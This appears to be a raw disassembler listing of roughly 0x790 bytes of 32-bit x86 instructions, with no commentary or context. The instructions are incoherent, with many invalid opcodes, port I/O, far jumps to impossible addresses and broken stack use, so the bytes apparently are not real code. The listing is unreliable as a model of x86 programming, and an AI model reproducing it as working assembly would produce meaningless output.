  410c28:	rol    DWORD PTR [edi+0x12319150],1
  410c2e:	xor    ah,BYTE PTR [ebp-0x76]
  410c31:	scas   al,BYTE PTR es:[edi]
  410c32:	sbb    DWORD PTR [ebp+0x2ff64af0],0xffffffa9
  410c39:	jnp    0x410c15
  410c3b:	jmp    FWORD PTR [ebp-0xb644085]
  410c41:	cmp    esi,DWORD PTR [eax]
  410c43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c44:	ror    DWORD PTR [eax],cl
  410c46:	fmul   DWORD PTR [eax+0x5e6f2758]
  410c4c:	sbb    DWORD PTR [edi-0x2],ecx
  410c4f:	ret    0x8092
  410c52:	nop
  410c53:	cmp    BYTE PTR [edx],ah
  410c55:	sbb    bh,BYTE PTR [edi+0x7b]
  410c58:	or     ch,BYTE PTR [esi+0x42]
  410c5b:	pmaddwd mm2,QWORD PTR [ecx]
  410c5e:	push   ebp
  410c5f:	loop   0x410c25
  410c61:	mov    DWORD PTR [edx],esp
  410c63:	fnstenv [eax+0x38]
  410c66:	in     al,dx
  410c67:	pop    esi
  410c68:	mov    dh,0x72
  410c6a:	cmp    esi,DWORD PTR ds:0x676ee1d6
  410c70:	inc    esi
  410c71:	push   ecx
  410c72:	mov    edx,0x49dea86
  410c77:	cmp    DWORD PTR [ecx],edx
  410c79:	ins    DWORD PTR es:[edi],dx
  410c7a:	int    0xe3
  410c7c:	mov    ss,WORD PTR [esi-0x1a]
  410c7f:	add    eax,0x4475ff5
  410c84:	test   DWORD PTR [edx+0x55b9cc7d],esi
  410c8a:	dec    esp
  410c8b:	cmp    DWORD PTR [esi],esi
  410c8d:	mov    cl,0xaa
  410c8f:	sbb    al,0xc3
  410c91:	xchg   BYTE PTR [ebx-0x58cb1b76],ch
  410c97:	jnp    0x410c53
  410c99:	call   0x8d7325fc
  410c9e:	jecxz  0x410c29
  410ca0:	daa    
  410ca1:	cmp    BYTE PTR [ecx+0x161e9b74],ch
  410ca7:	and    BYTE PTR [ebp+0x69],dl
  410caa:	outs   dx,DWORD PTR ds:[esi]
  410cab:	dec    ebx
  410cac:	pop    ds
  410cad:	dec    esp
  410cae:	xor    BYTE PTR ds:0x4881379,bl
  410cb4:	jne    0x410cfb
  410cb6:	outs   dx,DWORD PTR ds:[esi]
  410cb7:	dec    eax
  410cb8:	repz mov al,0x55
  410cbb:	pop    ecx
  410cbc:	pushf  
  410cbd:	(bad)  
  410cbe:	outs   dx,BYTE PTR ds:[esi]
  410cbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cc0:	out    dx,al
  410cc1:	mov    DWORD PTR [ebx],eax
  410cc3:	stc    
  410cc4:	scas   al,BYTE PTR es:[edi]
  410cc5:	cmp    al,0xa1
  410cc7:	cmp    ebx,ecx
  410cc9:	dec    edx
  410cca:	add    al,0x57
  410ccc:	out    0xa9,al
  410cce:	or     eax,0x474bd538
  410cd3:	aaa    
  410cd4:	cmc    
  410cd5:	mov    edi,0x253d3548
  410cda:	lods   al,BYTE PTR ds:[esi]
  410cdb:	xor    DWORD PTR [eax+0x2aaa983b],ecx
  410ce1:	es jge 0x410d36
  410ce4:	add    BYTE PTR ds:0x8fab0c75,cl
  410cea:	push   edx
  410ceb:	jns    0x410d50
  410ced:	push   esi
  410cee:	inc    ebp
  410cef:	mov    ecx,0x58c13521
  410cf4:	fs sbb esi,ebp
  410cf7:	add    ecx,DWORD PTR [esi]
  410cf9:	js     0x410d77
  410cfb:	sub    BYTE PTR [ebx-0xac29d5c],bl
  410d01:	mov    ch,BYTE PTR [ebp+0x147e57f5]
  410d07:	push   eax
  410d08:	push   ds
  410d09:	cmp    eax,0x82b7cacd
  410d0e:	fnstenv [ecx-0x120553]
  410d14:	cmc    
  410d15:	xchg   ebx,eax
  410d16:	cmp    DWORD PTR [ecx],ebx
  410d18:	loop   0x410d3b
  410d1a:	mov    eax,ds:0xf0e7a09e
  410d1f:	jbe    0x410d16
  410d21:	fwait
  410d22:	push   esi
  410d23:	mov    cl,0x1f
  410d25:	dec    eax
  410d26:	test   BYTE PTR [ebp+0x2570cdf5],ah
  410d2c:	cld    
  410d2d:	push   esi
  410d2e:	push   esp
  410d2f:	outs   dx,DWORD PTR ds:[esi]
  410d30:	repz ds stc 
  410d33:	ret    
  410d34:	cli    
  410d35:	dec    edi
  410d36:	xor    al,0xb0
  410d38:	in     eax,0xf8
  410d3a:	les    ebx,FWORD PTR [eax]
  410d3c:	jb     0x410d1c
  410d3e:	outs   dx,BYTE PTR ds:[esi]
  410d3f:	ja     0x410ce3
  410d41:	fstp   TBYTE PTR [ebx-0x413a98d4]
  410d47:	aas    
  410d48:	sbb    BYTE PTR [edi+0x52844e25],dh
  410d4e:	inc    edi
  410d4f:	repnz cmp al,0x54
  410d52:	outs   dx,DWORD PTR ds:[esi]
  410d53:	aas    
  410d54:	pop    es
  410d55:	pop    ecx
  410d56:	mov    esi,0x5102d6b7
  410d5b:	cmp    DWORD PTR [ecx],esp
  410d5d:	fwait
  410d5e:	jno    0x410d73
  410d60:	nop
  410d61:	(bad)
  410d64:	cmc    
  410d65:	xchg   DWORD PTR [ebx+esi*4+0x74152731],edx
  410d6c:	jmp    0xd690bdae
  410d71:	scas   eax,DWORD PTR es:[edi]
  410d72:	and    eax,0x9d92d63c
  410d77:	pop    eax
  410d78:	dec    esi
  410d79:	mov    ebp,DWORD PTR [esi-0x1d]
  410d7c:	sub    ah,BYTE PTR [edi-0x7d0c5b0e]
  410d82:	lods   eax,DWORD PTR ds:[esi]
  410d83:	cmp    BYTE PTR [ebx+0x72],ah
  410d86:	mov    bh,0xf4
  410d88:	or     DWORD PTR [esi],edi
  410d8a:	aam    0xc3
  410d8c:	div    BYTE PTR [edx-0x8afa515]
  410d92:	pop    eax
  410d93:	or     eax,0x1532daa9
  410d98:	push   esp
  410d99:	dec    esp
  410d9a:	cmp    bh,BYTE PTR [ecx]
  410d9c:	addr16 lahf 
  410d9e:	xchg   esp,eax
  410d9f:	adc    DWORD PTR [edx+0x5e],ebx
  410da2:	gs das 
  410da4:	cmc    
  410da5:	pop    ebx
  410da6:	inc    edx
  410da7:	xchg   edi,eax
  410da8:	bound  ecx,QWORD PTR [ebx+0x380fc9d3]
  410dae:	or     BYTE PTR [edx],0x6e
  410db1:	loopne 0x410d37
  410db3:	xor    DWORD PTR [ebx],edx
  410db5:	mov    ecx,0xd126106e
  410dba:	pop    ds
  410dbb:	sbb    ecx,ecx
  410dbd:	out    0xc4,al
  410dbf:	cwde   
  410dc0:	inc    BYTE PTR [ebx]
  410dc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dc3:	sub    ebx,DWORD PTR [ecx+0x7533d2ab]
  410dc9:	dec    cl
  410dcb:	push   ebp
  410dcc:	mov    ah,0x93
  410dce:	outs   dx,BYTE PTR ds:[esi]
  410dcf:	sub    esp,esp
  410dd1:	mov    eax,0xcd8b1e81
  410dd6:	ret    0xc938
  410dd9:	and    DWORD PTR [ebx+0x3c],edi
  410ddc:	popf   
  410ddd:	inc    ebp
  410dde:	sub    ebp,ecx
  410de0:	cmc    
  410de1:	mov    edx,0xc975fddb
  410de6:	add    dl,ch
  410de8:	mov    cl,0x9
  410dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410deb:	xor    cl,bl
  410ded:	xchg   edx,eax
  410dee:	mov    ds:0xc03b8bda,eax
  410df3:	mov    WORD PTR [esp+ebp*8],?
  410df6:	(bad)  
  410df7:	add    al,0x11
  410df9:	(bad)  
  410dfa:	cmp    eax,0x190668a0
  410dff:	jae    0x410da3
  410e01:	sub    ah,BYTE PTR [edi+0x34]
  410e04:	fstp   QWORD PTR [ecx+0x42]
  410e07:	pop    ebp
  410e08:	mov    esi,0x41941e3a
  410e0d:	jnp    0x410e13
  410e0f:	xchg   edx,eax
  410e10:	jo     0x410dea
  410e12:	jno    0x410df2
  410e14:	cmc    
  410e15:	ja     0x410e6e
  410e17:	in     eax,0xec
  410e19:	push   ds
  410e1a:	pop    edi
  410e1b:	sbb    DWORD PTR ds:[eax],edi
  410e1e:	data16 clc 
  410e20:	imul   ebp,DWORD PTR [ebx+0x7f],0xf
  410e24:	inc    esp
  410e25:	sub    eax,0x4131e461
  410e2a:	push   ss
  410e2b:	int    0xf5
  410e2d:	jmp    0x9fab6436
  410e32:	push   es
  410e33:	sub    esp,DWORD PTR [esi+0x513960a7]
  410e39:	sbb    dh,BYTE PTR [ecx*2+0x6d708e89]
  410e40:	jmp    0x2efa:0xfcf318e8
  410e47:	mov    cl,0xc
  410e49:	add    bl,BYTE PTR [ebx-0x45]
  410e4c:	jbe    0x410e86
  410e4e:	dec    esi
  410e4f:	xor    eax,0x16e17cab
  410e54:	icebp  
  410e55:	aad    0xc2
  410e57:	repz push esp
  410e59:	ss retf 
  410e5b:	fs push edx
  410e5d:	pop    eax
  410e5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e5f:	push   ebp
  410e60:	mov    edx,0x5388860
  410e65:	div    DWORD PTR [edx]
  410e67:	push   0xb6255cb
  410e6c:	cmc    
  410e6d:	scas   al,BYTE PTR es:[edi]
  410e6e:	jb     0x410e14
  410e70:	pushf  
  410e71:	int    0xdd
  410e73:	xor    eax,0xc6b23093
  410e78:	(bad)  
  410e79:	push   edx
  410e7a:	scas   al,BYTE PTR es:[edi]
  410e7b:	sub    eax,0x8f417bc7
  410e80:	pop    es
  410e81:	in     eax,dx
  410e82:	(bad)  
  410e83:	(bad)  ds:0xcbf72d38
  410e89:	repnz adc al,0x4d
  410e8c:	inc    edx
  410e8d:	cmp    BYTE PTR [edi+edx*2-0x219183b],ah
  410e94:	call   0x31d2:0x4ee26f2a
  410e9b:	iret   
  410e9c:	cmp    DWORD PTR [edx+0x2276a929],esp
  410ea2:	cmp    edi,DWORD PTR [esi]
  410ea4:	lea    eax,[eax-0x1a]
  410ea7:	shr    ah,0xde
  410eaa:	add    ecx,DWORD PTR [ebp-0xf]
  410ead:	stos   DWORD PTR es:[edi],eax
  410eae:	jge    0x410eee
  410eb0:	ja     0x410f22
  410eb2:	mov    ?,WORD PTR [eax+0x9]
  410eb5:	fwait
  410eb6:	inc    esi
  410eb7:	sub    esp,DWORD PTR [edx+0x38]
  410eba:	cmp    eax,0xf0edee9b
  410ebf:	scas   al,BYTE PTR es:[edi]
  410ec0:	inc    ebp
  410ec1:	aaa    
  410ec2:	outs   dx,BYTE PTR ds:[esi]
  410ec3:	ss cs dec ebx
  410ec6:	jbe    0x410edc
  410ec8:	mov    bl,0x2d
  410eca:	lds    edi,FWORD PTR [esi]
  410ecc:	pop    edx
  410ecd:	mov    bl,0xc8
  410ecf:	cs ins BYTE PTR es:[edi],dx
  410ed1:	stc    
  410ed2:	out    dx,al
  410ed3:	mov    ah,0xbb
  410ed5:	call   0xbe60:0xab3000cb
  410edc:	adc    edi,DWORD PTR [edi]
  410ede:	pop    ss
  410edf:	cmp    eax,0x78ade1a5
  410ee4:	inc    esp
  410ee5:	jmp    0x410ee5
  410ee7:	jle    0x410ede
  410ee9:	loope  0x410eb2
  410eeb:	shl    DWORD PTR [esi+0x24a1c05],1
  410ef1:	cmp    dh,ah
  410ef3:	mov    al,0x1
  410ef5:	xor    DWORD PTR [ecx+0x6e8ebbcd],edi
  410efb:	out    dx,al
  410efc:	into   
  410efd:	or     dl,BYTE PTR fs:[edi-0x71]
  410f01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f02:	ret    0x7138
  410f05:	test   BYTE PTR [ebx],0xcc
  410f08:	pop    edi
  410f09:	push   ss
  410f0a:	aam    0x93
  410f0c:	test   BYTE PTR ds:0x62d1197c,0xf9
  410f13:	inc    ebx
  410f14:	leave  
  410f15:	inc    ecx
  410f16:	repz cmp BYTE PTR [ebp+0x5c],dl
  410f1a:	sbb    DWORD PTR [ecx-0x2],esp
  410f1d:	int    0xf5
  410f1f:	inc    eax
  410f20:	cmc    
  410f21:	adc    eax,0xfd1633ec
  410f26:	sub    BYTE PTR [edx-0x74],0xab
  410f2a:	mov    dl,0x38
  410f2c:	data16 sti 
  410f2e:	jp     0x410f84
  410f30:	popf   
  410f31:	fs mov dl,0x9c
  410f34:	in     al,0xf1
  410f36:	jmp    0x3c16:0x9b787902
  410f3d:	ja     0x410f4d
  410f3f:	cmp    DWORD PTR [edx+edi*1-0x62],eax
  410f43:	pop    edi
  410f44:	mov    ds:0xf574e2dd,eax
  410f49:	mov    ecx,esi
  410f4b:	stos   DWORD PTR es:[edi],eax
  410f4c:	push   ds
  410f4d:	jl     0x410eea
  410f4f:	std    
  410f50:	push   ecx
  410f51:	stos   BYTE PTR es:[edi],al
  410f52:	retf   
  410f53:	sbb    al,0xd6
  410f55:	jmp    0x6f2:0xe1693934
  410f5c:	cli    
  410f5d:	push   ecx
  410f5e:	push   0x13
  410f60:	and    ebx,DWORD PTR [ecx+0x5ad4456a]
  410f66:	hlt    
  410f67:	push   esi
  410f68:	shl    DWORD PTR [ecx],1
  410f6a:	inc    ecx
  410f6b:	xor    BYTE PTR [esp+ebp*8],al
  410f6e:	je     0x410f50
  410f70:	pushf  
  410f71:	or     esp,DWORD PTR [edi]
  410f73:	shl    DWORD PTR [eax+0x48b86e87],0x54
  410f7a:	xchg   ebx,eax
  410f7b:	xor    al,0xc7
  410f7d:	stos   BYTE PTR es:[edi],al
  410f7e:	add    BYTE PTR [ecx],bh
  410f80:	adc    BYTE PTR [edi-0x229e0ff],bh
  410f86:	jne    0x410f64
  410f88:	cmc    
  410f89:	cmp    al,0xad
  410f8b:	stos   DWORD PTR es:[edi],eax
  410f8c:	add    WORD PTR [edx],0xff80
  410f90:	popf   
  410f91:	adc    DWORD PTR [edx-0x39],esi
  410f94:	repz cmp edx,DWORD PTR [ecx]
  410f97:	into   
  410f98:	mov    ah,0xcf
  410f9a:	sub    ebp,DWORD PTR [edx+0x1]
  410f9d:	xchg   edx,eax
  410f9e:	inc    ebp
  410f9f:	(bad)  
  410fa0:	call   0xbfeaf3bd
  410fa5:	sub    eax,DWORD PTR [edi+0x4838385a]
  410fab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fac:	popa   
  410fad:	jo     0x410f9e
  410faf:	push   eax
  410fb0:	in     eax,dx
  410fb1:	retf   0x176e
  410fb4:	push   0x21
  410fb6:	imul   esp,DWORD PTR [edx],0xe8fcefac
  410fbc:	ds push esi
  410fbe:	repnz cmp BYTE PTR [edx+0x36],bh
  410fc2:	imul   esp,DWORD PTR [eax-0x77a73765],0x37a8cc18
  410fcc:	cmc    
  410fcd:	pop    esp
  410fce:	sbb    esi,DWORD PTR [esi]
  410fd0:	push   ebp
  410fd1:	dec    ecx
  410fd2:	(bad)  
  410fd3:	cmp    BYTE PTR [eax+0x78],dh
  410fd6:	adc    ch,dh
  410fd8:	aas    
  410fd9:	cmp    al,0x26
  410fdb:	cs cmc 
  410fdd:	ins    DWORD PTR es:[edi],dx
  410fde:	lds    ecx,FWORD PTR [edx+0x1df3dce7]
  410fe4:	xor    BYTE PTR [eax],bh
  410fe6:	adc    al,0x6a
  410fe8:	sbb    DWORD PTR [ebx-0x2a],edx
  410feb:	dec    ebx
  410fec:	adc    BYTE PTR [edi+0x6f],bl
  410fef:	iret   
  410ff0:	ret    0xb38f
  410ff3:	aad    0xb9
  410ff5:	or     BYTE PTR ss:[esi],bh
  410ff8:	jg     0x410fa2
  410ffa:	or     bh,BYTE PTR [edi+0x1c]
  410ffd:	or     ecx,DWORD PTR [ebx]
  410fff:	inc    edx
  411000:	add    eax,0x1beeef28
  411005:	inc    esi
  411006:	jmp    0xdcf4:0xac3bc0e9
  41100d:	jecxz  0x410f96
  41100f:	test   ch,dh
  411011:	inc    ebp
  411012:	dec    esp
  411013:	pop    esi
  411014:	repz pop es
  411016:	out    dx,al
  411017:	mov    cl,0x66
  411019:	cmp    eax,0x8ce4c0e7
  41101e:	imul   esi,DWORD PTR [ebp+esi*8-0x594bdb72],0xae39b074
  411029:	adc    DWORD PTR [edx],edx
  41102b:	int    0x7f
  41102d:	out    0xee,al
  41102f:	jne    0x411073
  411031:	in     al,0xd8
  411033:	sti    
  411034:	inc    ebx
  411035:	mov    bh,0x6e
  411037:	jns    0x410fde
  411039:	pop    ebp
  41103a:	xchg   ebp,eax
  41103b:	dec    edi
  41103c:	jle    0x411035
  41103e:	inc    eax
  41103f:	ds ins BYTE PTR es:[edi],dx
  411041:	js     0x4110c0
  411043:	push   es
  411044:	inc    edi
  411045:	cld    
  411046:	mov    DWORD PTR [eax+0x21],eax
  411049:	sbb    ebp,DWORD PTR [edi+0x16]
  41104c:	stos   DWORD PTR es:[edi],eax
  41104d:	pop    edx
  41104e:	in     eax,dx
  41104f:	jnp    0x4110bc
  411051:	adc    edx,DWORD PTR [ebx+0x2d]
  411054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411055:	loopne 0x410fec
  411057:	cmp    dh,dh
  411059:	repz popf 
  41105b:	stos   BYTE PTR es:[edi],al
  41105c:	mov    bh,0xe2
  41105e:	pop    ss
  41105f:	call   0xcc50:0x9757c1f5
  411066:	mov    edi,0xd2e76672
  41106b:	or     ch,dh
  41106d:	xor    DWORD PTR [edi+edi*2+0x3d4e4210],esp
  411074:	cmc    
  411075:	and    al,0xde
  411077:	leave  
  411078:	cmp    BYTE PTR [ebp+0x4e8325f],bl
  41107e:	(bad)  
  41107f:	jne    0x411049
  411081:	pop    eax
  411082:	iret   
  411083:	mov    eax,0xb3d590e4
  411088:	repz xor bl,BYTE PTR [edx+eiz*4-0xb]
  41108d:	adc    DWORD PTR [esi],eax
  41108f:	in     eax,dx
  411090:	test   DWORD PTR [ebx+0x3ba81be1],ebx
  411096:	bound  esp,QWORD PTR [edi-0x7e63fe9b]
  41109c:	inc    eax
  41109d:	lods   al,BYTE PTR ds:[esi]
  41109e:	mov    al,ds:0x773baf9f
  4110a3:	pop    edi
  4110a4:	sti    
  4110a5:	push   ebp
  4110a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110a7:	rep stos BYTE PTR es:[edi],al
  4110a9:	cmp    al,0xd7
  4110ab:	in     al,dx
  4110ac:	push   0x4a
  4110ae:	sbb    edx,DWORD PTR [ebp+edi*4-0xa54f704]
  4110b5:	mov    edx,0x91f7b281
  4110ba:	add    eax,DWORD PTR [ebx]
  4110bc:	das    
  4110bd:	xor    eax,0xccbec6e3
  4110c2:	cmc    
  4110c3:	or     eax,0x2f1e18e3
  4110c8:	mov    dl,0xd6
  4110ca:	jne    0x4110ab
  4110cc:	and    al,0x46
  4110ce:	xchg   esi,eax
  4110cf:	or     eax,0xfa978e75
  4110d4:	shl    BYTE PTR [eax],cl
  4110d6:	fnstcw WORD PTR [eax+0x34]
  4110d9:	dec    ebx
  4110da:	xchg   edx,eax
  4110db:	or     BYTE PTR [edi-0x17f3370f],ah
  4110e1:	mov    cl,cl
  4110e3:	dec    esi
  4110e4:	test   eax,0x6d594a3f
  4110e9:	mov    eax,0xf0072aa4
  4110ee:	or     al,0xe1
  4110f0:	mov    ch,0x28
  4110f2:	jge    0x411079
  4110f4:	mov    WORD PTR [edx],es
  4110f6:	push   0xeb6bc17b
  4110fb:	push   0xd004dbb6
  411100:	dec    ebp
  411101:	xor    edi,eax
  411103:	and    eax,0x590c619a
  411108:	dec    esi
  411109:	call   0x432532d2
  41110e:	ins    DWORD PTR es:[edi],dx
  41110f:	retf   0x98e2
  411112:	xor    BYTE PTR [ecx+ecx*8-0x23],bl
  411116:	std    
  411117:	cmp    BYTE PTR [ebx+ebx*4+0x3b],dh
  41111b:	enter  0xfd22,0x2b
  41111f:	mov    ecx,0xcfec9df5
  411124:	inc    eax
  411125:	cmc    
  411126:	add    al,0x8d
  411128:	icebp  
  411129:	ds leave 
  41112b:	inc    ecx
  41112c:	jl     0x411198
  41112e:	pop    es
  41112f:	mov    ecx,0xba801d7
  411134:	cmc    
  411135:	(bad)  
  411137:	dec    edi
  411138:	ror    bh,cl
  41113a:	or     bl,BYTE PTR [ecx+0x3]
  41113d:	cmp    eax,0x4192aaf8
  411142:	sbb    al,0xa
  411144:	cmp    eax,0x5839151e
  411149:	into   
  41114a:	imul   esi,DWORD PTR [ecx+0x1b],0xffffffff
  41114e:	sub    bl,BYTE PTR [eax]
  411150:	std    
  411151:	xor    BYTE PTR [eax-0x7],dl
  411154:	dec    edx
  411155:	aam    0xdb
  411157:	inc    ebx
  411158:	xchg   ebp,eax
  411159:	daa    
  41115a:	push   ebx
  41115b:	sbb    eax,0x9a0ff2f5
  411160:	mov    ds:0xf4c5bd41,eax
  411165:	cmp    eax,DWORD PTR [eax]
  411167:	sti    
  411168:	ret    0xed69
  41116b:	pushf  
  41116c:	faddp  st(4),st
  41116e:	fsubr  DWORD PTR [ecx-0xb]
  411171:	cmp    eax,0x833031f6
  411176:	(bad)  
  411177:	mov    dl,0x64
  411179:	test   al,0x2b
  41117b:	cmp    DWORD PTR [eax+0x32],eax
  41117e:	xchg   esp,eax
  41117f:	imul   BYTE PTR [ecx-0xa0f1c62]
  411185:	scas   eax,DWORD PTR es:[edi]
  411186:	jg     0x411148
  411188:	pop    ss
  411189:	jb     0x4111f9
  41118b:	cdq    
  41118c:	mov    edi,0x7e3956a2
  411191:	xor    DWORD PTR [edi],eax
  411193:	mov    esp,0xf7eed59f
  411198:	cmc    
  411199:	loope  0x4111cf
  41119b:	mov    WORD PTR [edx],es
  41119d:	jecxz  0x4111f7
  41119f:	cmp    BYTE PTR [edi-0x12c7315d],dl
  4111a5:	pop    esi
  4111a6:	xchg   BYTE PTR [esi],dl
  4111a8:	int3   
  4111a9:	(bad)
  4111ac:	in     al,0xa8
  4111ae:	lds    esp,FWORD PTR [ebx+edx*8+0x1b]
  4111b2:	in     eax,0x84
  4111b4:	inc    edi
  4111b5:	mov    bl,0x79
  4111b7:	cmp    BYTE PTR [edi],dl
  4111b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111ba:	test   al,0x60
  4111bc:	or     eax,0xf583ee27
  4111c1:	rcl    BYTE PTR [edx-0x1f],cl
  4111c4:	or     DWORD PTR [ecx+0x40],0xffffff9d
  4111c8:	les    edi,FWORD PTR [ebx]
  4111ca:	out    dx,al
  4111cb:	inc    esi
  4111cc:	push   ecx
  4111cd:	push   esi
  4111ce:	mov    esi,0x6e00f88c
  4111d3:	jne    0x41120f
  4111d5:	pop    es
  4111d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111d7:	pop    esi
  4111d8:	cmp    BYTE PTR ds:0x1f4388e,dl
  4111de:	call   0xcc517ae7
  4111e3:	xchg   ebp,eax
  4111e4:	je     0x41116f
  4111e6:	outs   dx,BYTE PTR ds:[esi]
  4111e7:	aam    0xba
  4111e9:	jmp    0xd3230fcf
  4111ee:	idiv   BYTE PTR [eax]
  4111f0:	stos   BYTE PTR es:[edi],al
  4111f1:	dec    edi
  4111f2:	or     al,0x9f
  4111f4:	lds    edi,FWORD PTR [ebx+0x11f59c6a]
  4111fa:	cld    
  4111fb:	lds    esi,FWORD PTR [eax+0x1a]
  4111fe:	fs ja  0x411231
  411201:	cmp    ebp,DWORD PTR [ecx+0x2d]
  411204:	mov    dh,0x65
  411206:	pop    esi
  411207:	ror    DWORD PTR [ebx],0x40
  41120a:	popf   
  41120b:	sbb    dh,ch
  41120d:	scas   eax,DWORD PTR es:[edi]
  41120e:	test   eax,edi
  411210:	in     eax,dx
  411211:	sub    BYTE PTR [edi-0x28add573],bh
  411217:	cmp    eax,eax
  411219:	xchg   esi,eax
  41121a:	mov    al,0x92
  41121c:	icebp  
  41121d:	fst    DWORD PTR [ebx+0x59]
  411220:	sar    BYTE PTR [edi+ebp*2-0x1b],1
  411224:	xor    esi,esi
  411226:	fdivr  st(5),st
  411228:	iret   
  411229:	int3   
  41122a:	in     eax,dx
  41122b:	leave  
  41122c:	aad    0x3b
  41122e:	and    DWORD PTR [ebp-0x7d],ebx
  411231:	in     al,0x17
  411233:	test   DWORD PTR [edi],ebp
  411235:	or     al,0x6e
  411237:	mov    dh,bl
  411239:	sar    ah,1
  41123b:	mov    ds:0x387627ae,eax
  411240:	mov    dl,0x41
  411242:	js     0x41123f
  411244:	dec    ebx
  411245:	out    0x13,eax
  411247:	fist   WORD PTR [edx]
  411249:	jmp    0x4111d3
  41124b:	push   cs
  41124c:	ret    
  41124d:	mov    ax,ds:0x65856d38
  411253:	ret    0xec60
  411256:	stos   BYTE PTR es:[edi],al
  411257:	cmp    BYTE PTR [ebx],dh
  411259:	fdiv   DWORD PTR [edx]
  41125b:	xchg   edx,eax
  41125c:	aam    0x5e
  41125e:	pop    eax
  41125f:	add    edx,ebp
  411261:	xor    BYTE PTR [ebx],0x94
  411264:	daa    
  411265:	mov    eax,0x355f53ee
  41126a:	adc    bh,BYTE PTR [ecx]
  41126c:	je     0x41123e
  41126e:	xchg   edi,eax
  41126f:	fiadd  WORD PTR [ecx]
  411271:	sub    dl,BYTE PTR [edi+0x6e95f916]
  411277:	sbb    BYTE PTR [edx],ch
  411279:	into   
  41127a:	xor    BYTE PTR [esi],ah
  41127c:	ins    DWORD PTR es:[edi],dx
  41127d:	and    eax,0x36ebc5f8
  411282:	jae    0x41127c
  411284:	jmp    0x4c701e8
  411289:	inc    ebx
  41128a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41128b:	push   esi
  41128c:	xor    eax,DWORD PTR [ebx-0x35d1476e]
  411292:	sbb    al,0xde
  411294:	jno    0x411226
  411296:	jecxz  0x4112b8
  411298:	dec    ebp
  411299:	xchg   ebx,eax
  41129a:	cmp    edi,DWORD PTR [edi-0x58]
  41129d:	sub    DWORD PTR [edi-0xe],ebp
  4112a0:	pop    ebp
  4112a1:	add    dl,BYTE PTR [ebx+edx*4+0x70]
  4112a5:	into   
  4112a6:	jnp    0x4112fc
  4112a8:	adc    bh,BYTE PTR [eax]
  4112aa:	jbe    0x4112ca
  4112ac:	fstp   DWORD PTR [ebx+0x40e6e895]
  4112b2:	outs   dx,DWORD PTR ds:[esi]
  4112b3:	mov    edi,0xf40fedf7
  4112b8:	loopne 0x41128a
  4112ba:	in     al,0x58
  4112bc:	(bad)  
  4112bd:	cmp    esp,DWORD PTR [edx+0x4710daf5]
  4112c3:	cmc    
  4112c4:	inc    esi
  4112c5:	adc    ebp,DWORD PTR [esi-0x70]
  4112c8:	xor    DWORD PTR [ecx+edi*8-0xf3d4d67],0x3d
  4112d0:	jmp    0x4112a7
  4112d2:	mov    ah,0x67
  4112d4:	aas    
  4112d5:	js     0x4112fb
  4112d7:	lahf   
  4112d8:	out    dx,eax
  4112d9:	cld    
  4112da:	outs   dx,BYTE PTR ds:[esi]
  4112db:	inc    edx
  4112dc:	add    BYTE PTR [edx],0x56
  4112df:	or     DWORD PTR [ebx-0x67b93528],ecx
  4112e5:	cmp    ebx,DWORD PTR [edx]
  4112e7:	in     eax,0x73
  4112e9:	push   ecx
  4112ea:	scas   al,BYTE PTR es:[edi]
  4112eb:	out    0xa2,eax
  4112ed:	(bad)  
  4112ee:	outs   dx,BYTE PTR ds:[esi]
  4112ef:	jo     0x41132d
  4112f1:	push   ebp
  4112f2:	call   0x5f39:0x1f7a2bdf
  4112f9:	int    0x74
  4112fb:	push   0xffffffe9
  4112fd:	mov    al,0xf1
  4112ff:	xchg   edx,eax
  411300:	cmc    
  411301:	dec    edx
  411302:	fcomp  QWORD PTR [edx]
  411304:	sbb    ebp,DWORD PTR [ebx]
  411306:	jecxz  0x411331
  411308:	leave  
  411309:	cmp    edi,DWORD PTR [esi]
  41130b:	(bad)  
  41130c:	xchg   edx,eax
  41130d:	add    eax,0xf1045db1
  411312:	outs   dx,BYTE PTR ds:[esi]
  411313:	push   0xffffff80
  411315:	inc    edi
  411316:	jns    0x411330
  411318:	mov    ch,0x84
  41131a:	cmp    DWORD PTR [eax],0xc1b0f41d
  411320:	imul   eax,eax,0xffffff97
  411323:	shl    ch,cl
  411325:	ficomp DWORD PTR ds:0xf2d75aeb
  41132b:	jmp    DWORD PTR [edx]
  41132d:	cmp    BYTE PTR [edx+0x12],dh
  411330:	(bad)  
  411332:	jg     0x41137e
  411334:	test   eax,0xcd2e7c30
  411339:	test   eax,0x5fc298e8
  41133e:	lods   eax,DWORD PTR ds:[esi]
  41133f:	mov    edx,0x6e0f098d
  411344:	shr    BYTE PTR [edi+0x5b75bbd7],1
  41134a:	pusha  
  41134b:	mov    dl,0x0
  41134d:	test   eax,0xd3ada6e
  411352:	mov    dh,0x22
  411354:	pushf  
  411355:	fimul  WORD PTR [eax+edi*1+0xbdf53d2]
  41135c:	test   dl,bl
  41135e:	add    BYTE PTR [edx-0xc95d10a],cl
  411364:	inc    esi
  411365:	aas    
  411366:	std    
  411367:	out    0x55,al
  411369:	xor    cl,BYTE PTR [esi+0x700fd438]
  41136f:	mov    ecx,0xba9f582a
  411374:	cmc    
  411375:	enter  0xe1a1,0x70
  411379:	or     eax,0x38e98d5a
  41137e:	push   ebx
  41137f:	or     BYTE PTR [edi-0x5b7c6fd6],bl
  411385:	sbb    DWORD PTR [ebp+ecx*2-0xc91e6e6],0xffffff9c
  41138d:	jmp    0xf6e1:0x3bbad6da
  411394:	in     al,dx
  411395:	into   
  411396:	add    ecx,esp
  411398:	shl    DWORD PTR [edi+ebp*2-0x35],0x9d
  41139d:	or     BYTE PTR [eax],ah
  41139f:	inc    eax
  4113a0:	adc    ebx,DWORD PTR [ebp+0x23]
  4113a3:	cmp    DWORD PTR [edx+0x6769aca7],edx
  4113a9:	and    al,0x84
  4113ab:	sub    ch,dh
  4113ad:	out    0xdf,eax
  4113af:	shl    dl,1
